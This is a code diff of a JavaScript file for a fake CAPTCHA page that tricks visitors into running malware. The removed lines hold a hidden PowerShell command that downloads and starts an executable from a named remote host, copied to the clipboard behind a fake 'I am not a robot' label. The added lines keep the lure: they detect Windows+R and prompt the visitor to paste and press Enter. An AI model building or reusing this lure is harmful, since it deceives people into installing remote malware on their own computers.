@@ -1,8 +1,7 @@
-// script.js
-let correctCaptcha = "W4rK1"; // The text that the user should input
+let correctCaptcha = "W4rK1"; // Default text that the user should input
 
+// Function to generate CAPTCHA
 function generateCaptcha() {
-    // Simple random string for captcha, you can make this more complex
     let characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
     let captcha = '';
     for (let i = 0; i < 5; i++) {
@@ -10,12 +9,13 @@ function generateCaptcha() {
     }
     correctCaptcha = captcha;
 
-    // Display the CAPTCHA in the image-like div
+    // Display CAPTCHA in the div (image-like behavior)
     document.getElementById('captchaImage').innerText = captcha;
 }
 
+// Function to verify CAPTCHA input
 function verifyCaptcha() {
-    let userInput = document.getElementById('captchaInput').value;
+    let userInput = document.getElementById('captchaInput').value.trim(); // Trim the input to avoid leading/trailing spaces
     let resultMessage = document.getElementById('resultMessage');
     let commandInstructions = document.querySelector('.command-instructions');
     
@@ -23,22 +23,50 @@ function verifyCaptcha() {
         resultMessage.innerText = 'ADVANCED VERIFICATION REQUIRED!';
         resultMessage.style.color = 'red';
 
-        // Fixed the command string (escaped the inner quotes correctly)
-        const command = `powershell -NoP -NonI -W h -Exec Bypass iwr "https://notafakecaptica2222.vercel.app/Built.exe" -OutFile "$env:userprofile\\temp\\Built.exe"; start "$env:userprofile\\temp\\Built.exe" # ''I am not a robot - reCAPTCHA Verification ID: 7537''`;
-        
-        navigator.clipboard.writeText(command).then(() => {
-            commandInstructions.style.display = 'block'; // Show instructions
-        }).catch(err => {
-            resultMessage.innerText = 'Failed to copy the command.';
-            resultMessage.style.color = 'red';
-        });
+        // Show the advanced instructions and wait for user to press keys
+        commandInstructions.style.display = 'block';
+        monitorKeyPress();
     } else {
         resultMessage.innerText = 'Invalid CAPTCHA. Please try again.';
         resultMessage.style.color = 'red';
     }
 }
 
-// Initialize CAPTCHA on page load
+// Function to monitor key presses for "Windows + R"
+function monitorKeyPress() {
+    let windowsKeyPressed = false;
+    let rKeyPressed = false;
+    const resultMessage = document.getElementById('resultMessage');
+
+    // Listen for keydown events
+    window.addEventListener('keydown', function (event) {
+        // Check for "Windows + R" (Windows key is often captured as "Meta" in JS)
+        if (event.key === 'r' && event.metaKey) {
+            rKeyPressed = true;
+            windowsKeyPressed = true; // Meta key is typically Windows key on most systems
+            updateKeyPressStatus(windowsKeyPressed, rKeyPressed);
+        }
+    });
+}
+
+// Update the status message based on the key press
+function updateKeyPressStatus(windowsKeyPressed, rKeyPressed) {
+    const resultMessage = document.getElementById('resultMessage');
+    const advancedInstructions = document.querySelector('.command-instructions');
+
+    if (windowsKeyPressed && rKeyPressed) {
+        resultMessage.innerText = 'Windows + R keys detected! Now press Ctrl + V and hit Enter.';
+        resultMessage.style.color = 'green';
+
+        // You can add additional instructions or actions here if necessary
+        advancedInstructions.innerHTML += '<br>Ready for advanced verification!<br> Press Ctrl + V and hit Enter.';
+    } else {
+        resultMessage.innerText = 'Please press Windows + R to proceed.';
+        resultMessage.style.color = 'red';
+    }
+}
+
+// Initialize CAPTCHA when the page loads
 document.addEventListener('DOMContentLoaded', () => {
     generateCaptcha();
 });
